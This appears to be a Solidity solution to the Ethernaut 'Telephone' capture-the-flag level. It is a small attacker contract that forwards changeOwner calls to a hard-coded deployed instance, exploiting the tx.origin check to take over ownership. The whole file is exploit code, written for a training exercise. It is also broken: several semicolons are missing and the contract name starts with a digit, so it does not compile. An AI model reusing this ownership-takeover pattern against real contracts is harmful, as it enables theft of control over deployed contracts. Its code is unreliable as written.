pragma solidity ^0.6.0

// Make sure Telephone.sol (Ethernaut contract is in the same directory)
import "./Telephone.sol"

contract 4_telephone {
	Telephone public t = Telephone(0x3937f3Cc58B36b3acDca8902085dA96DD9230a10);

	function changeOwner(address _owner) public {
		t.changeOwner(_owner)
	}
}
